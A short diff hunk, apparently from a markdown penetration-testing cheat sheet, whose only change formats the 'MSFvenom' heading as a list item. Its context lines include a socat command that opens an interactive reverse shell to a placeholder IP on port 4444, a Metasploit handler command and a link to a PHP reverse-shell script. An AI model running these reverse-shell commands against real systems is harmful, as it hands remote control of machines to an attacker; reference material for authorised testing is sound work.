@@ -551,7 +551,7 @@ $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP address>:4444
 msf> use exploit/multi/handler
 ```
 
-MSFvenom
+- MSFvenom
 
 ```
 http://pentestmonkey.net/tools/web-shells/php-reverse-shell
